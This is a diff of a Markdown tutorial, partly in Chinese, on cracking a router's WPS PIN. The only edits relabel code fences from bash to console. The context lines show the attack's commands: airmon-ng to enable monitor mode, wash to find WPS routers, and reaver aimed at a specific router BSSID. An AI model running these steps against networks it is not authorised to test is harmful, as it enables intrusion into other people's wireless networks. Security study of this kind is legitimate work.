@@ -44,7 +44,7 @@ _reaver_ 通过穷举的方式暴力破解这个 _PIN_
 
 ### Insert a USB-wireless-interface
 
-```bash
+```console
 $ ifconfig
 ```
 
@@ -54,7 +54,7 @@ _wlan0_ is the wireless interface I have just inserted
 
 ### Turn the wireless-interface into monitor mode
 
-```bash
+```console
 $ airmon-ng start wlan0
 ```
 
@@ -62,7 +62,7 @@ $ airmon-ng start wlan0
 
 ### Check whether the monitor mode is on
 
-```bash
+```console
 $ ifconfig
 ```
 
@@ -72,7 +72,7 @@ _wlan0mon_ is the wireless-interface which has been turned into monitor mode
 
 ### Search for the Routers which support WPS
 
-```bash
+```console
 $ wash -i wlan0mon
 ```
 
@@ -92,7 +92,7 @@ $ wash -i wlan0mon
 
 ### Start cracking by reaver
 
-```bash
+```console
 $ reaver -i wlan0mon -b EC:88:8F:51:DD:A2 -vv
 ```
 
